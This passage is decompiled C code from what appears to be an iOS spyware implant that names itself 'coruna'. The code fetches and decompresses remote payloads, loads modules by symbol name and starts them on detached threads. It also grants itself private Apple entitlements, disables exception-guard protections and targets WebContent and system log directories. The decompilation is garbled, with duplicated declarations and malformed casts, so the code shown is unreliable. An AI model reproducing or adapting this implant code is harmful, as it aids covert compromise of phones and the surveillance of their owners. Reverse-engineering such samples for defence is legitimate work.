      if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
        (*(void (*)val[0xbe])(val,0xcc103,0,0x730c4e65);
      }
      if ((int)u == 0) {
        if (((plist == (short *)0x0) || (*plist != 2)) || ((ushort)plist[1] < 2)) {
          u = 0x28007;
          if ((*(char *)((long)val + 0x5eb) != '\0') &&
             (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
            err = 0xe6a;
            goto done;
          }
        }
        else {
          tmp_buf = (void (*)0x0;
          region = 0;
          u = coruna_implant_residual_39(work[0],0x80000,"_startl",&region,&tmp_buf);
          if ((int)u == 0) {
            u = (*tmp_buf)(val,plist);
            if ((int)u == 0) {
              if ((*(char *)((long)val + 0x5c6) == '\0') ||
                 ((**(void (**)(work[0] + 0x60))(work[0],region),
                 *(char *)((long)val + 0x5c6) == '\0')) {
                u = 0;
                goto cleanup;
              }
              u = 0;
            }
            else {
              (**(void (**)(work[0] + 0x60))(work[0],region);
            }
          }
          else if ((*(char *)((long)val + 0x5eb) != '\0') &&
                  ((void (*)val[0xbe] != (void (*)0x0)) {
            (*(void (*)val[0xbe])(val,u,0,0x730c4e4b);
          }
          (**(void (**)(plist + 8))();
          if (((int)u == 0) && (*(char *)((long)val + 0x5c6) == '\0')) goto cleanup;
        }
      }
      else if ((*(char *)((long)val + 0x5eb) != '\0') &&
              (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
        err = 0xe68;
done:
        (*ptr)(val,u,0,err + 0x730c404e);
      }
      (**(void (**)(work[0] + 0x60))(work[0],json_buf);
    }
    else if ((*(char *)((long)val + 0x5eb) != '\0') &&
            (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
      err = 0xe5c;
      goto check_ok;
    }
  }
  else if ((*(char *)((long)val + 0x5eb) != '\0') &&
          (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
    err = 0xe52;
check_ok:
    (*ptr)(val,u,0,err + 0x730c404e);
  }
cleanup:
  coruna_implant_via_dlopen_rpath(work[0],val);
fail:
  if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
    (*(void (*)val[0xbe])(val,u,0,0x730c404e);
  }
  if (*(char *)((long)val + 0x5c2) == '\0') {
    val[0x16] = path_buf;
    val[6] = scratch;
    val[7] = sa_saved;
    val[0x25] = sa_new;
    val[0x26] = stack_guard;
    val[0x1d] = serial_buf;
    val[0x1e] = bootargs;
    val[0x1f] = thread_attr;
    val[0x20] = scratch;
    val[0x23] = type_id_8;
    val[0x24] = action;
    val[0x21] = host_info;
    val[0x22] = 0;
    *val = port;
    val[1] = size;
    val[2] = version;
    val[3] = tag;
    val[4] = kind;
    val[5] = block_ctx;
    val[0xbe] = type_id;
  }
  return u;
}





uint64_t _startr(short *arg)
{
  bool err;
  short *lps2;
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((lps2 = *(short **)(arg + 0x1c), lps2 != (short *)0x0 && (*lps2 == 1)) &&
      (lps2[1] != 0)))) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(lps2 + 0xc))(lps2,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        return 0xad001;
      }
      if (scratch == 0) {
        return 0xad001;
      }
      if (scratch < 0x18) {
        return 0xad014;
      }
      if (*bootargs != -0x21522ff1) {
        return 0xad014;
      }
      err = (char)bootargs[1] != '\0';
    }
    else {
      if ((int)u != 0x7003) {
        return u;
      }
      err = false;
    }
    u = coruna_run_startx(arg,err,1);
  }
  return u;
}
unsigned long coruna_run_startx(short *arg,uint val,int n)

{
  uint32_t u;
  uint size;
  char *ptr;
  unsigned long version;
  uint port;
  short *lps6;
  unsigned long kind;
  short *lps8;
  unsigned long type_id;
  short *lps10;
  long stack_guard;
  short *sa_saved;
  void *sa_new;
  unsigned long path_buf;
  char *tmp_buf;
  char region [8];
  long plist;
  long url_buf;
  unsigned long json_buf;
  uint32_t frame;
  uint64_t scratch;
  uint32_t work;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t scratch;
  char *action;
  uint64_t cache;
  unsigned long cache_20;
  
  type_id = 0xad001;
  if ((((((arg == (short *)0x0) || (*arg != 1)) || (arg[1] == 0)) ||
       (((lps8 = *(short **)(arg + 0x14), lps8 == (short *)0x0 || (*lps8 != 3)) ||
        ((lps8[1] == 0 ||
         ((lps6 = *(short **)(arg + 0x18), lps6 == (short *)0x0 || (*lps6 != 2)))))))) ||
      ((ushort)lps6[1] < 2)) ||
     (((sa_saved = *(short **)(arg + 0x1c), sa_saved == (short *)0x0 || (*sa_saved != 1)) ||
      (sa_saved[1] == 0)))) {
    return 0xad001;
  }
  region[0] = '\0';
  region[1] = '\0';
  region[2] = '\0';
  region[3] = '\0';
  region[4] = '\0';
  region[5] = '\0';
  region[6] = '\0';
  region[7] = '\0';
  plist = 0;
  url_buf = 0;
  stack_guard = 0;
  sa_new = (void *)0x0;
  path_buf = 0;
  tmp_buf = region;
  if (((val & 1) != 0) || (n != 0)) {
    if (*(double *)k_implant_dyldversionnumber_slot < k_implant_rodata_word_1e840) {
      region[0] = (char)val;
    }
    else if (*(void (**)(void))(lps6 + 0x20) != (void (*)0x0) {
      scratch = k_implant_rodata_word_0001e858;
      host_info = k_implant_rodata_word_1e850;
      kind = (**(void (**)(void))(lps6 + 0x20))(lps6,&stack_guard,&host_info,1,0);
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
    else {
      kind = 0xad001;
      if (stack_guard != 0) {
      (**(void (**)(void))(lps6 + 0x18))();
      (**(void (**)(void))(lps6 + 0x10))(lps6,stack_guard);
      }
      return kind;
    }
  }
  if (val == 0) {
    if (n != 0) {
nomem:
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,0xcc10a,0x730c4207);
      }
      cache_20 = 0;
      scratch = (unsigned long)scratch << 0x20;
      kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70001,&cache_20,&scratch);
      if ((int)kind == 0) {
        cache = 0;
        json_buf = json_buf & 0xffffffff00000000;
        port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&cache,&json_buf);
        size = 0;
        if (port != 0x7003) {
          size = port;
        }
        kind = (unsigned long)size;
        if (size == 0) {
          kind = coruna_cfhttpmessagesetheaderfieldvalue(cache_20,cache,0,0,&sa_new,&path_buf);
          if ((int)kind == 0) {
            host_info = 0;
            thread_attr = thread_attr & 0xffffffff00000000;
            kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
            while ((int)kind == 0x7003 || (int)kind == 0) {
              if ((int)kind == 0x7003) {
                kind = coruna_compression_decode_buffer(&sa_new,&path_buf);
              }
              else {
                coruna_implant65fc_via_u64_pack(host_info,sa_new,path_buf & 0xffffffff);
                kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70002,&host_info,&thread_attr);
              }
            }
            if ((int)kind == 0) {
              kind = (**(void (**)(sa_saved + 8))(sa_saved,sa_new,path_buf & 0xffffffff);
              if ((int)kind != 0) {
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4277);
                }
                _bzero(sa_new,path_buf & 0xffffffff);
                _free(sa_new);
                sa_new = (void *)0x0;
                path_buf = path_buf & 0xffffffff00000000;
              }
              if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
              }
            }
            else {
              _bzero(sa_new,path_buf & 0xffffffff);
              _free(sa_new);
              sa_new = (void *)0x0;
              path_buf = path_buf & 0xffffffff00000000;
              if (tmp_buf != (char *)0x0) {
                if (*tmp_buf != '\0') {
                  coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
                }
                if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
                  coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
                }
              }
            }
          }
          else if (tmp_buf != (char *)0x0) {
            if (*tmp_buf != '\0') {
              coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
            }
            if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
              coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
            }
          }
        }
        else if (tmp_buf != (char *)0x0) {
          if (*tmp_buf != '\0') {
            coruna_call_parse_https_url(tmp_buf,kind,0x730c4260);
          }
          if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
            coruna_call_parse_https_url(tmp_buf,0xcc10b,0x730c4263);
          }
        }
      }
      if ((int)kind != 0) {
        if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
          coruna_parse_https_url(url_buf,plist,kind,0,0x730c452e);
        }
        if (stack_guard != 0) {
        (**(void (**)(lps6 + 0x18))();
        (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
        }
        return kind;
      }
    }
  }
  else {
    lps10 = *(short **)(arg + 0x1c);
    kind = 0xad001;
    if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
    }
    return kind;
  }
  if (((region[0] != '\0') && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,0xcc10c,0,0x730c4522);
  }
  thread_attr = 0;
  work = 0;
  scratch = 0;
  frame = 0;
  port = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70003,&thread_attr,&work);
  size = 0;
  if (port != 0x7003) {
    size = port;
  }
  kind = (unsigned long)size;
  if (((size == 0) &&
      (kind = (**(void (**)(sa_saved + 0xc))(sa_saved,0x70004,&scratch,&frame),
      (int)kind == 0x7003)) || ((int)kind == 0)) {
    json_buf = 0;
    kind = coruna_strdup_2(&json_buf,sa_saved,lps6,lps8,thread_attr,scratch);
    version = json_buf;
    ptr = tmp_buf;
    if ((int)kind == 0) {
      if (json_buf == 0) {
        if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
          coruna_call_parse_https_url(tmp_buf,type_id,0x730c4ca9);
        }
      }
      else {
        cache = 0;
        cache_20 = 0;
        type_id = coruna_implant65fc_residual_86(json_buf,0x10000,"_startx",&cache_20,&cache);
        if ((int)type_id == 0) {
          host_info = version;
          scratch = cache;
          action = ptr;
          type_id = coruna_pthread_attr_setdetachstate(coruna_implant65fc_via_call_parse_https_url,&host_info);
          if ((((int)type_id != 0) && (ptr != (char *)0x0)) && (*ptr != '\0')) {
            coruna_call_parse_https_url(ptr,type_id,0x730c4cba);
          }
          (**(void (**)(version + 0x60))(version,cache_20);
        }
        else if ((ptr != (char *)0x0) && (*ptr != '\0')) {
          coruna_call_parse_https_url(ptr,type_id,0x730c4cb3);
        }
      }
      coruna_implant65fc_via_ctx_free_9e78_2(json_buf);
    }
    else {
      type_id = kind;
      if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
        coruna_call_parse_https_url(tmp_buf,kind,0x730c4316);
      }
    }
  }
  else {
    type_id = kind;
    if ((tmp_buf != (char *)0x0) && (*tmp_buf != '\0')) {
      coruna_call_parse_https_url(tmp_buf,kind,0x730c430d);
      type_id = kind;
    }
  }
  if (((((int)type_id != 0) && (region[0] != '\0')) && (url_buf != 0)) && (plist != 0)) {
    coruna_parse_https_url(url_buf,plist,type_id,0,0x730c4510);
  }
  kind = type_id;
  if (sa_new != (void *)0x0) {
    if ((int)path_buf != 0) {
      _bzero(sa_new,path_buf & 0xffffffff);
      _free(sa_new);
      sa_new = (void *)0x0;
      path_buf = path_buf & 0xffffffff00000000;
    }
  }
retry:
  if (stack_guard != 0) {
    (**(void (**)(lps6 + 0x18))();
    (**(void (**)(lps6 + 0x10))(lps6,stack_guard);
  }
  return kind;
}





void _startm(uint64_t val)
{
  coruna_run_startx(val,0,0);
  return;
}





uint64_t coruna_startl_thread(long *handle)
{
  uint64_t u;
  uint64_t scratch;
  
  if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
    (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,0xcc106,0,0x730c4cf0);
  }
  if ((((handle == (long *)0x0) || (*handle == 0)) || (handle[2] == 0)) || ((int)handle[3] == 0)
     ) {
    if (k_implant_rodata_word_2c718 != (uint32_t *)0x0) {
    *k_implant_rodata_word_2c718 = 5;
    }
    return 0;
  }
  else {
    scratch = 0;
    u = coruna_bzero_3(&scratch);
    if ((int)u == 0) {
      u = coruna_run_startsc(&k_implant_rodata_word_2c138,scratch,0);
      if ((((int)u != 0) && (k_implant_rodata_word_2c723 != '\0')) && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
        (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,u,0,0x730c4ccc);
      }
      coruna_find_objc_methlist(scratch);
      scratch = 0;
    }
    else if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
      (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,u,0,0x730c4cc6);
    }
    if ((char)handle[1] != '\0') {
      (**(void (**)(*handle + 0x10))();
    }
    _memset_s(handle[2],(int)handle[3],0,(int)handle[3]);
    _free((void *)handle[2]);
    if (handle[4] != 0) {
      coruna_free_secure_str();
    }
    if (handle[5] != 0) {
      coruna_free_secure_str();
    }
    if (handle[6] != 0) {
      coruna_free_secure_str();
    }
    _memset_s(handle,0x38,0,0x38);
    _free(handle);
  }
  if ((k_implant_rodata_word_2c723 != '\0') && (k_implant_rodata_word_2c728 != (void (*)0x0)) {
    (*k_implant_rodata_word_2c728)(&k_implant_rodata_word_2c138,0xcc107,0,0x730c4f22);
  }
code_r0x000096dc:
  if (k_implant_rodata_word_2c718 != (uint32_t *)0x0) {
    *k_implant_rodata_word_2c718 = 5;
  }
  return 0;
}





unsigned long coruna_run_startsc(long arg,long val,long n)

{
  uint32_t u;
  uint32_t *ptr;
  uint64_t type_id_8;
  uint version;
  char err;
  bool err;
  uint8_t *buf;
  uint8_t *str;
  bool status;
  uint type_id_9;
  int status;
  void (*buf)(void);
  long handle;
  long addr;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  uint64_t cache_21;
  uint64_t bootargs;
  uint64_t cache_22;
  uint64_t thread_attr;
  uint64_t cache_23;
  char *cache_24;
  long cache_25;
  void (*cache_26)(void);
  uint cache_27;
  char *cache_28;
  char scratch [8];
  char bootargs [8];
  uint64_t host_info;
  char cache_29;
  uint64_t serial_buf;
  char cache_30;
  uint64_t action;
  char cache_31;
  char thread_attr [8];
  char host_info [8];
  char cache_32 [8];
  char serial_buf [7];
  char cache_33;
  char action [7];
  uint8_t cache_34[936];
  uint8_t cache_35;
  mach_port_name_t cache_36;
  uint64_t host_info;
  
  cache_25 = n;
  if (arg == 0) {
    if (val == 0) {
      return 0xad001;
    }
load_ok_15:
    bootargs = 0;
    thread_attr = 0;
    cache_21 = 8;
    cache_22 = 10;
    cache_24 = 
    "<dict><key>com.apple.private.webbookmarks.settings</key><true/><key>com.apple.private.security.storage.DiagnosticReports.read-write</key><true/></dict>"
    ;
    cache_23 = 0x40000004;
    type_id_10 = (**(void (**)(val + 0x80))(val,&cache_25,&cache_21,3,0);
    str = k_implant_task_set_exc_guard_behavior_slot;
    buf = k_implant_mach_task_self_slot;
    if ((int)type_id_10 == 0) {
      if (k_implant_task_get_exc_guard_behavior_slot == (uint8_t *)0x0 ||
          k_implant_task_set_exc_guard_behavior_slot == (uint8_t *)0x0) {
        status = false;
        type_id_11 = 0;
load_ok_16:
        handle = cache_25;
        cache_28 = (char *)0x0;
        type_id_10 = coruna_implant65fc_residual_85(val,&cache_28);
        if (((int)type_id_10 == 0) && ((char)cache_28 == '\0')) {
          host_info = (char *)0x0;
          cache_26 = (void (*)0x0;
          type_id_9 = coruna_implant65fc_residual_86(val,0xa0000,"_startsc",&host_info,&cache_26);
          if (type_id_9 == 0) {
            type_id_10 = (*cache_26)(val,handle,&cache_28);
            (**(void (**)(val + 0x60))(val,host_info);
          }
          else {
            version = 0;
            if (type_id_9 != 0x7003) {
              version = type_id_9;
            }
            type_id_10 = (unsigned long)version;
          }
        }
        host_info = (char *)((unsigned long)host_info & 0xffffffff00000000);
        (**(void (**)(val + 0xe0))(val,0xa0000,&host_info,4);
        if ((int)type_id_10 == 0) {
          do {
            if (k_implant_rodata_word_24c98 != '\0') {
              type_id_10 = 0;
              ClearExclusiveLocal();
              break;
            }
            err = '\x01';
            err = (bool)coruna_ldrex_pass(0x24c98,0x10);
            if (err) {
              k_implant_rodata_word_24c98 = '\x01';
              err = coruna_ldrexp_clear();
            }
          } while (err != '\0');
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,0xcc108,0,0x730c4a49);
          }
          cache_28 = (char *)0x0;
          cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
          type_id_10 = (**(void (**)(val + 0x68))(val,0x80000,&cache_28,&cache_26);
          if ((int)type_id_10 == 0) {
            host_info = (char *)0x0;
            type_id_10 = coruna_implant65fc_residual_87(&host_info,val);
            if ((int)type_id_10 == 0) {
              if (*(int *)((long)host_info + 0x14) == 0) {
                type_id_10 = 0;
              }
              else {
                type_id_12 = 0;
                type_id_10 = 0;
                handle = (long)host_info;
                do {
                  if (*(int *)(handle + 0x10) != 0) {
                    type_id_9 = 0;
                    do {
                      cache_36 = 0;
                      addr = handle + type_id_12 * 0xc;
                      status = *(int *)(addr + 0x18);
                      ptr = (uint32_t *)(handle + (unsigned long)*(uint *)(addr + 0x1c));
                      type_id_10 = 0xad014;
                      if (status - 2U < 2) {
                        if (*(char *)((long)ptr +
                                     (unsigned long)(*(int *)(handle + type_id_12 * 0xc + 0x20) - 1)) == '\0') {
                          type_id_8 = 1;
                          if (status != 3) {
                            type_id_8 = 2;
                          }
                          type_id_10 = (**(void (**)(val + 0xf8))
                                             (val,ptr,type_id_8,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                          if ((int)type_id_10 == 0) {
                            if (*(int *)((long)host_info + 0xc) == 0) {
load_ok_19:
                              type_id_10 = 0;
                            }
                            else {
                              cache_27 = 0xad000;
                              type_id_10 = (**(void (**)(val + 0x100))
                                                 (val,cache_36,*(int *)((long)host_info + 0xc),
                                                  &cache_27);
                              if ((int)type_id_10 == 0x1e02a) {
                                type_id_10 = 0;
                              }
                              if ((int)type_id_10 == 0) {
                                type_id_10 = (unsigned long)cache_27;
                              }
                              else if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                                      (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                                (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4ac6);
                              }
                            }
                            _mach_port_mod_refs(*(ipc_space_t *)k_implant_mach_task_self_slot,
                                                cache_36,1,-1);
                            goto load_ok_17;
                          }
                        }
                      }
                      else if (status == 1) {
                        if (*(int *)(handle + type_id_12 * 0xc + 0x20) == 4) {
                          type_id_10 = (**(void (**)(val + 0xf0))
                                             (val,*ptr,cache_28,
                                              (unsigned long)cache_26 & 0xffffffff,"_startr",0,0,&cache_36)
                          ;
                        }
                        else {
                          type_id_10 = 0xad014;
                        }
                      }
                      if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
                         (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
                        (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4d37);
                      }
                      type_id_9 = type_id_9 + 1;
                      handle = (long)host_info;
                    } while (type_id_9 < *(uint *)((long)host_info + 0x10));
                  }
                  type_id_12 = type_id_12 + 1;
                } while (type_id_12 < *(uint *)(handle + 0x14));
              }
            }
          }
        }
load_ok_17:
        host_info = (char *)0x0;
        status = coruna_implant65fc_residual_85(val,&host_info);
        if ((status == 0) && ((char)host_info == '\0')) {
          _bzero(&cache_31,0x3d0);
          scratch[0] = s__private_var_mobile_Library_Logs_0001ea09[8];
          scratch[1] = s__private_var_mobile_Library_Logs_0001ea09[9];
          scratch[2] = s__private_var_mobile_Library_Logs_0001ea09[10];
          scratch[3] = s__private_var_mobile_Library_Logs_0001ea09[0xb];
          scratch[4] = s__private_var_mobile_Library_Logs_0001ea09[0xc];
          scratch[5] = s__private_var_mobile_Library_Logs_0001ea09[0xd];
          scratch[6] = s__private_var_mobile_Library_Logs_0001ea09[0xe];
          scratch[7] = s__private_var_mobile_Library_Logs_0001ea09[0xf];
          cache_28 = (char *)0;
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x18];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x19];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1a];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1b];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1c];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1d];
          host_info = s__private_var_mobile_Library_Logs_0001ea09[0x1e];
          bootargs[0] = s__private_var_mobile_Library_Logs_0001ea09[0x10];
          bootargs[1] = s__private_var_mobile_Library_Logs_0001ea09[0x11];
          bootargs[2] = s__private_var_mobile_Library_Logs_0001ea09[0x12];
          bootargs[3] = s__private_var_mobile_Library_Logs_0001ea09[0x13];
          bootargs[4] = s__private_var_mobile_Library_Logs_0001ea09[0x14];
          bootargs[5] = s__private_var_mobile_Library_Logs_0001ea09[0x15];
          bootargs[6] = s__private_var_mobile_Library_Logs_0001ea09[0x16];
          bootargs[7] = s__private_var_mobile_Library_Logs_0001ea09[0x17];
          cache_30 = (char)0;
          action = SUB87(0,1);
          cache_29 = s__private_var_mobile_Library_Logs_0001ea09[0x1f];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x20];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x21];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x22];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x23];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x24];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x25];
          serial_buf = s__private_var_mobile_Library_Logs_0001ea09[0x26];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
          _bzero(cache_34,0x3a8);
          action = (uint64_t)0;
          cache_31 = SUB81(0,7);
          serial_buf = (uint64_t)0;
          cache_30 = SUB81(0,7);
          host_info[0] = s__var_containers_Shared_SystemGro_0001ea38[0x38];
          host_info[1] = s__var_containers_Shared_SystemGro_0001ea38[0x39];
          host_info[2] = s__var_containers_Shared_SystemGro_0001ea38[0x3a];
          host_info[3] = s__var_containers_Shared_SystemGro_0001ea38[0x3b];
          host_info[4] = s__var_containers_Shared_SystemGro_0001ea38[0x3c];
          host_info[5] = s__var_containers_Shared_SystemGro_0001ea38[0x3d];
          host_info[6] = s__var_containers_Shared_SystemGro_0001ea38[0x3e];
          host_info[7] = s__var_containers_Shared_SystemGro_0001ea38[0x3f];
          thread_attr[0] = s__var_containers_Shared_SystemGro_0001ea38[0x30];
          thread_attr[1] = s__var_containers_Shared_SystemGro_0001ea38[0x31];
          thread_attr[2] = s__var_containers_Shared_SystemGro_0001ea38[0x32];
          thread_attr[3] = s__var_containers_Shared_SystemGro_0001ea38[0x33];
          thread_attr[4] = s__var_containers_Shared_SystemGro_0001ea38[0x34];
          thread_attr[5] = s__var_containers_Shared_SystemGro_0001ea38[0x35];
          thread_attr[6] = s__var_containers_Shared_SystemGro_0001ea38[0x36];
          thread_attr[7] = s__var_containers_Shared_SystemGro_0001ea38[0x37];
          serial_buf[0] = s__var_containers_Shared_SystemGro_0001ea38[0x48];
          serial_buf[1] = s__var_containers_Shared_SystemGro_0001ea38[0x49];
          serial_buf[2] = s__var_containers_Shared_SystemGro_0001ea38[0x4a];
          serial_buf[3] = s__var_containers_Shared_SystemGro_0001ea38[0x4b];
          serial_buf[4] = s__var_containers_Shared_SystemGro_0001ea38[0x4c];
          serial_buf[5] = s__var_containers_Shared_SystemGro_0001ea38[0x4d];
          serial_buf[6] = s__var_containers_Shared_SystemGro_0001ea38[0x4e];
          cache_32[0] = s__var_containers_Shared_SystemGro_0001ea38[0x40];
          cache_32[1] = s__var_containers_Shared_SystemGro_0001ea38[0x41];
          cache_32[2] = s__var_containers_Shared_SystemGro_0001ea38[0x42];
          cache_32[3] = s__var_containers_Shared_SystemGro_0001ea38[0x43];
          cache_32[4] = s__var_containers_Shared_SystemGro_0001ea38[0x44];
          cache_32[5] = s__var_containers_Shared_SystemGro_0001ea38[0x45];
          cache_32[6] = s__var_containers_Shared_SystemGro_0001ea38[0x46];
          cache_32[7] = s__var_containers_Shared_SystemGro_0001ea38[0x47];
          cache_33 = s__var_containers_Shared_SystemGro_0001ea38[0x4f];
          action[0] = s__var_containers_Shared_SystemGro_0001ea38[0x50];
          action[1] = s__var_containers_Shared_SystemGro_0001ea38[0x51];
          action[2] = s__var_containers_Shared_SystemGro_0001ea38[0x52];
          action[3] = s__var_containers_Shared_SystemGro_0001ea38[0x53];
          action[4] = s__var_containers_Shared_SystemGro_0001ea38[0x54];
          action[5] = s__var_containers_Shared_SystemGro_0001ea38[0x55];
          action[6] = s__var_containers_Shared_SystemGro_0001ea38[0x56];
          scratch[0] = s__var_containers_Shared_SystemGro_0001ea38[8];
          scratch[1] = s__var_containers_Shared_SystemGro_0001ea38[9];
          scratch[2] = s__var_containers_Shared_SystemGro_0001ea38[10];
          scratch[3] = s__var_containers_Shared_SystemGro_0001ea38[0xb];
          scratch[4] = s__var_containers_Shared_SystemGro_0001ea38[0xc];
          scratch[5] = s__var_containers_Shared_SystemGro_0001ea38[0xd];
          scratch[6] = s__var_containers_Shared_SystemGro_0001ea38[0xe];
          scratch[7] = s__var_containers_Shared_SystemGro_0001ea38[0xf];
          cache_28 = (char *)0;
          host_info = (uint64_t)0;
          cache_29 = SUB81(0,7);
          bootargs[0] = s__var_containers_Shared_SystemGro_0001ea38[0x10];
          bootargs[1] = s__var_containers_Shared_SystemGro_0001ea38[0x11];
          bootargs[2] = s__var_containers_Shared_SystemGro_0001ea38[0x12];
          bootargs[3] = s__var_containers_Shared_SystemGro_0001ea38[0x13];
          bootargs[4] = s__var_containers_Shared_SystemGro_0001ea38[0x14];
          bootargs[5] = s__var_containers_Shared_SystemGro_0001ea38[0x15];
          bootargs[6] = s__var_containers_Shared_SystemGro_0001ea38[0x16];
          bootargs[7] = s__var_containers_Shared_SystemGro_0001ea38[0x17];
          cache_35 = 0;
          coruna_find_webcontent(&cache_28,host_info);
        }
        cache_28 = (char *)0x0;
        cache_26 = (void (*)((unsigned long)cache_26 & 0xffffffff00000000);
        host_info = (char *)0x0;
        cache_36 = 0;
        status = (**(void (**)(val + 0x68))(val,0x70001,&cache_28,&cache_26);
        if ((((status == 0) && ((int)cache_26 != 0)) && (cache_28 != (char *)0x0)) &&
           (*cache_28 != '\0')) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        status = (**(void (**)(val + 0x68))(val,0x70003,&host_info,&cache_36);
        if (((status == 0) && (cache_36 != 0)) && ((host_info != (char *)0x0 && (*host_info != '\0')))
           ) {
          coruna_pthread_attr_setdetachstate(coruna_call_objc_opt_respondstoselector);
        }
        if ((status) && (str != (uint8_t *)0x0)) {
          _task_set_exc_guard_behavior(*(uint32_t *)k_implant_mach_task_self_slot,type_id_11);
        }
      }
      else {
        cache_28 = (char *)((unsigned long)cache_28 & 0xffffffff00000000);
        type_id_9 = _task_get_exc_guard_behavior
                           (*(uint32_t *)k_implant_mach_task_self_slot,&cache_28);
        if (type_id_9 == 0) {
          type_id_10 = (unsigned long)cache_28 & 0x88;
          if (((unsigned long)cache_28 & 0x88) == 0) {
            type_id_11 = 0;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_9 = _task_set_exc_guard_behavior
                             (*(uint32_t *)buf,(uint)cache_28 & 0xffffff77);
          if (type_id_9 == 0) {
            type_id_11 = (unsigned long)cache_28 & 0xffffffff;
            status = type_id_10 != 0;
            goto load_ok_16;
          }
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
        else {
          type_id_10 = (unsigned long)(type_id_9 | 0x80000000);
          if (((arg != 0) && (*(char *)(arg + 0x5eb) != '\0')) &&
             (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
            (**(void (**)(arg + 0x5f0))(arg,type_id_10,0,0x730c4db9);
          }
        }
      }
      if (n == 0) {
        (**(void (**)(val + 0x88))(val,cache_25);
        (**(void (**)(val + 0x90))(val,cache_25);
        cache_25 = 0;
      }
      if (arg == 0) {
        return type_id_10;
      }
      if ((*(char *)(arg + 0x5eb) != '\0') && (*(void (**)(arg + 0x5f0) != (void (*)0x0)) {
        (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
      }
      return type_id_10;
    }
    if (arg == 0) {
      return type_id_10;
    }
    u = 0x730c4dae;
    if ((*(char *)(arg + 0x5eb) != '\0') &&
        (buf = *(void (**)(arg + 0x5f0), buf != (void (*)0x0)) {
      (*buf)(arg,type_id_10,0,u);
    }
  }
